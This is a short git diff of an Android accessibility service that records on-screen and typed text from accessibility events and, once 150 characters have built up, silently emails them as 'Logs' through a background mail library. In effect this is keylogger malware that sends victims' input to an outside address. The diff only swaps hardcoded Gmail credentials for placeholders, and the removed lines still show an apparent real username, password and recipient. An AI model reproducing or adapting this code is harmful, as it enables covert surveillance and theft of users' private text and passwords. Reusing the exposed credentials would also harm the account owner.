@@ -65,14 +65,14 @@ public class MyAccessibilityService extends AccessibilityService {
             List<CharSequence> testr22 = event.getText();
             String CutTestr22 = testr22.toString().substring(1, (testr22.toString().length() -1));
             loadData();
-            saveData2("||" + text + "->" + CutTestr22 + "||");
+            saveData2(" " + text + " " + CutTestr22 + " ");
             loadData2();
             clearData();
             if (OtherText.length() >= 150) {
                 BackgroundMail.newBuilder(this)
-                        .withUsername("jmaccoomer@gmail.com")
-                        .withPassword("coomer8898")
-                        .withMailTo("botswanaman@gmail.com")
+                        .withUsername("email@gmail.com")
+                        .withPassword("password")
+                        .withMailTo("email@gmail.com")
                         .withType(BackgroundMail.TYPE_PLAIN)
                         .withSubject("Logs ")
                         .withBody(OtherText)
